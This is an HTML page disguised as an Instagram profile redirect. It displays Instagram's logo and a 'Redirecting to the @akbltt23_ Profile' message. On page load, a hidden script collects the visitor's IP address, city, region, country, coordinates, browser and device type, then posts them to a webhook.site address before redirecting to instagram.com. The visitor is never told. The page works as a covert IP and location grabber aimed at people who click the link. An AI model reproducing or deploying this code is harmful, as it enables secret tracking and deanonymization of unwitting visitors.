<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting to Instagram...</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; text-align: center; padding: 50px; background: #fafafa; }
    h1 { color: #262626; font-size: 24px; }
    p { color: #8e8e8e; font-size: 14px; }
    .logo { width: 50px; margin-bottom: 20px; }
  </style>
</head>
<body>
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
<h1>Redirecting to the @akbltt23_ Profile...</h1>
<p>Please wait while we load the page. This may take a moment.</p>
<script>
  // Function to fetch and log visitor information
  async function logVisitorInfo() {
    try {
      // Fetch IP and geolocation data from ipapi.co
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) throw new Error('Failed to fetch geolocation data');
      const data = await response.json();

      // Extract detailed information
      const ip = data.ip;
      const city = data.city || 'Unknown';
      const region = data.region || 'Unknown';
      const country = data.country_name || 'Unknown';
      const latitude = data.latitude || 0;
      const longitude = data.longitude || 0;
      const browser = navigator.userAgent;
      const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

      // Prepare the data to send
      const logData = {
        ip: ip,
        location: `${city}, ${region}, ${country}`,
        coordinates: `(${latitude}, ${longitude})`,
        browser: browser,
        device: device,
        timestamp: new Date().toISOString()
      };

      // Log to browser console as a fallback
      console.log('Visitor Data:', logData);

      // Send the data to Webhook.site
      const webhookResponse = await fetch('https://webhook.site/83359319-2ce8-4095-afc3-47b971e2905d', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData)
      });

      if (!webhookResponse.ok) {
        throw new Error(`Webhook.site request failed: ${webhookResponse.status} ${webhookResponse.statusText}`);
      }

      const webhookResult = await webhookResponse.json();
      console.log('Webhook.site response:', webhookResult);

      // Update the page briefly
      document.body.innerHTML += `<p>Connecting to profile... Redirecting soon.</p>`;

      // Redirect to Instagram after a short delay
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com';
      }, 2000);
    } catch (error) {
      console.error('Error:', error.message);
      // Redirect even if there's an error
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com';
      }, 2000);
    }
  }

  // Run the function when the page loads
  logVisitorInfo();
</script>
</body>
</html>
